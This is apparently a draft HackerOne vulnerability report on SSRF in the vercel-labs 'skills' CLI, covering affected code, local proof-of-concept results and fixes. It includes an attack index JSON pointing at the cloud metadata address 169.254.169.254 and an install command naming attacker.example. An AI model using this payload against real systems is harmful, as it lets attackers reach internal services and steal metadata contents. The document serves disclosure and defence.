# C142 — vercel-labs/skills: Well-known v0.2 artifact URLs enable SSRF (loopback/link-local/redirect) and install of internal response bodies

**Program:** Vercel (HackerOne) — asset `https://github.com/vercel-labs/skills`  
**Package:** `skills@1.7.6` (npm) / git `7a5e920bead4b1039a6d6df5d7e1163b7b09423a`  
**Severity (proposed):** Medium (CVSS ~6.x) — CWE-918 SSRF; secondary CWE-200 when digest matches known internal body  
**Status:** CONFIRMED locally. **Do NOT submit** until explicit per-finding approval.  
**Researcher:** hao Yi / yihow1337 (authorized H1 research; local testing only)

## Summary

The well-known skills provider (`src/providers/wellknown.ts`) accepts **absolute** `entry.url` values for v0.2.0 discovery indexes and fetches them with Node `fetch()` **with no host allowlist, no private-IP / link-local / metadata blocklist, and no redirect revalidation**. The SHA-256 `digest` is checked **after** the body is fully downloaded — so:

1. **Blind SSRF / internal port probe** always occurs (wrong digest → `null`, but the request already hit the target).
2. If the attacker knows (or can predict) the internal response body, they set a matching digest and the CLI **installs that internal body as an agent skill** under `.agents/skills/…` (full agent permissions warning).

This is the same SSRF class Vercel already hardened in `vercel/ai` / `@ai-sdk/provider-utils` downloads (DNS pin + private-IP reject) and in `vercel/chat` adapter-shared download — but **skills still lacks it**.

## Affected code

- `isValidSkillEntryV2`: only checks `new URL(e.url, …)` parses; absolute URLs to any host accepted.
- `normalizeIndex`: `artifactUrl = new URL(entry.url, indexUrl).toString()` preserves absolute cross-origin targets.
- `fetchArtifactSkillByEntry`: `await fetch(entry.artifactUrl)` then digest compare.
- Same unrestricted `fetch` pattern in `download-source.ts` for direct archive/skill-md URLs (user-supplied URL; weaker confused-deputy story than index→artifact).

## Attack scenario

1. Victim (developer or CI) runs:  
   `npx skills@1.7.6 add https://attacker.example/ --skill helper -a cursor -y`
2. Attacker’s `/.well-known/agent-skills/index.json` lists:
   ```json
   {
     "$schema": "https://schemas.agentskills.io/discovery/0.2.0/schema.json",
     "skills": [{
       "name": "helper",
       "type": "skill-md",
       "description": "benign looking",
       "url": "http://169.254.169.254/latest/meta-data/",
       "digest": "sha256:<hash of known/predictable IMDS body>"
     }]
   }
   ```
3. CLI fetches IMDS (or other internal HTTP). On digest match, writes body to `.agents/skills/helper/SKILL.md`, which agents load with full permissions.

Also: relative same-origin artifact URL that **302-redirects** to another host/IP is followed by `fetch` with no private-IP check on the final hop (Case C).

## Local e2e (no third-party / no secrets)

Artifacts under `poc/r52-skills-wellknown-ssrf/`:

| Case | Result |
|------|--------|
| A — absolute artifact → `127.0.0.1/latest/meta-data/`, digest match | Skill installed; `INTERNAL_ONLY_MARKER` in SKILL.md |
| B — wrong digest | Skill not installed; loopback still received GET (blind SSRF) |
| C — relative URL → 302 to other loopback | Redirect followed; marker installed |
| CLI — `npx skills@1.7.6 add` | exit 0; hit + marker on disk |

Reproduce:

```bash
node poc/r52-skills-wellknown-ssrf/repro.mjs      # provider cases A/B/C
node poc/r52-skills-wellknown-ssrf/repro-cli.mjs  # published CLI install
```

Screenshots: `screenshots/01`–`05` (captioned PNGs).

## Impact

- Developer workstations and **CI runners** that install skills from third-party / compromised well-known publishers can be coerced into requesting loopback, RFC1918, link-local, and cloud metadata endpoints.
- Matching digest turns SSRF into **confidentiality breach**: internal HTTP bodies become on-disk agent skills (and thus LLM context).
- Digest is integrity of bytes, **not** authorization of destination host — it does not mitigate SSRF.

## Suggested fix

Mirror `vercel/chat` / AI SDK download hardening:

1. Allowlist artifact URL host to the index URL’s host (or explicit HTTPS allowlist), **or**
2. Resolve DNS, reject private/loopback/link-local/metadata ranges, pin addresses, and **re-validate every redirect hop**.
3. Prefer fail-closed before connecting; do not treat digest as a substitute for destination policy.

## Novelty

- No public GHSA/CVE for skills well-known artifact SSRF found (2026-11-04 search).
- Related public discussion: Seal Security skill **name overwrite**; issue #921 malicious **skill content** (curl in SKILL.md) — different class.
- AI SDK SSRF (issue #13510 / commit `1659cd5`) is a sibling pattern already fixed elsewhere in Vercel OSS — skills residual.

## Out of scope / non-goals for this report

- Malicious skill markdown prompt-injection after a *legitimate* same-host install (user-trust model).
- Production probing of Vercel infrastructure (local loopback only).

## Evidence integrity

See `EVIDENCE.tar.gz` + `EVIDENCE.sha256` in this directory after packaging.
